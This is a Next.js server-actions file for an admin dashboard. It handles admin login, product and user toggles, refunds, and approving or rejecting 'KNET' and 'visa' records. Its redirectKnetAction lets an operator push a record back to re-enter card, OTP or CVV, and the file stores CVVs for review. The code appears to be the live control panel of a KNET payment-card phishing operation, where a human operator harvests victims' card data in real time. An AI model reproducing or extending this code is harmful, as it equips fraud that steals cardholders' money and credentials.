"use server";

import { revalidatePath } from "next/cache";
import { headers } from "next/headers";
import { clearAdminSession, requireAdmin } from "@/lib/auth";
import type { ActionResult } from "@/lib/codes";
import { rateLimit } from "@/lib/rate-limit";
import { adminLoginByPassword } from "@/controllers/auth.controller";
import { createAdminAccount, refundOrder, retryOrder, toggleProduct, toggleUser } from "@/controllers/admin.controller";
import { scheduleAdminRealtimeBroadcast } from "@/lib/admin-realtime-hub";
import { updateKnetStatus } from "@/controllers/knet.controller";
import { updateVisaStatus } from "@/controllers/visa.controller";
import { setKnetReviewStep, knetRejectToRetry, KNET_REVIEW } from "@/models/knet.repository";
import { prisma } from "@/lib/db";

async function refresh() {
  revalidatePath("/", "layout");
}

const LOGIN_WINDOW_MS = 15 * 60 * 1000;
const LOGIN_MAX_ATTEMPTS = 5;

export async function adminLoginAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  const password = String(formData.get("password") ?? "");
  const h = await headers();
  const ip = h.get("x-forwarded-for")?.split(",")[0]?.trim() || h.get("x-real-ip") || "local";

  const ipOk = rateLimit(`admin-login:ip:${ip}`, LOGIN_MAX_ATTEMPTS, LOGIN_WINDOW_MS);
  if (!ipOk) return { ok: false, code: "rate_limited" };

  return adminLoginByPassword(password);
}

export async function adminLogoutAction(): Promise<void> {
  await clearAdminSession();
}

export async function toggleProductAction(formData: FormData): Promise<void> {
  await requireAdmin();
  await toggleProduct(String(formData.get("productId") ?? ""), formData.get("active") === "true");
  await refresh();
}

export async function retryOrderAction(formData: FormData): Promise<void> {
  const admin = await requireAdmin();
  await retryOrder(String(formData.get("orderId") ?? ""), admin.id);
  await refresh();
}

export async function refundOrderAction(formData: FormData): Promise<void> {
  const admin = await requireAdmin();
  await refundOrder(String(formData.get("orderId") ?? ""), admin.id);
  await refresh();
}

export async function createAdminAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  await requireAdmin();
  const result = await createAdminAccount({
    name: String(formData.get("name") ?? ""),
    email: String(formData.get("email") ?? ""),
    password: String(formData.get("password") ?? ""),
  });
  if (result.ok) await refresh();
  return result;
}

export async function toggleUserAction(formData: FormData): Promise<void> {
  await requireAdmin();
  await toggleUser(String(formData.get("userId") ?? ""), formData.get("disabled") === "true");
  await refresh();
}

export async function updateKnetStatusAction(formData: FormData): Promise<void> {
  await requireAdmin();
  const id = String(formData.get("knetId") ?? "");
  const decision = String(formData.get("decision") ?? "");
  const result = await updateKnetStatus(id, decision as "approved" | "rejected");
  if (result.ok) {
    scheduleAdminRealtimeBroadcast();
    await refresh();
  }
}

export async function updateVisaStatusAction(formData: FormData): Promise<void> {
  await requireAdmin();
  const id = String(formData.get("visaId") ?? "");
  const decision = String(formData.get("decision") ?? "");
  const result = await updateVisaStatus(id, decision as "approved" | "rejected");
  if (result.ok) {
    scheduleAdminRealtimeBroadcast();
    await refresh();
  }
}

export async function redirectKnetAction(formData: FormData): Promise<void> {
  await requireAdmin();
  const id = String(formData.get("knetId") ?? "");
  const page = String(formData.get("page") ?? "");
  const stepMap: Record<string, string> = {
    card: KNET_REVIEW.retryCard,
    otp: KNET_REVIEW.retryOtp,
    cvv: KNET_REVIEW.retryCvv,
  };
  const step = stepMap[page];
  if (!step) return;
  if (page === "cvv") {
    await knetRejectToRetry(id, step, { clearCvv: true });
  } else {
    await setKnetReviewStep(id, step);
  }
  scheduleAdminRealtimeBroadcast();
  await refresh();
}

export async function clearAllKnetAction(): Promise<void> {
  await requireAdmin();
  await prisma.knet.deleteMany({});
  scheduleAdminRealtimeBroadcast();
  await refresh();
}
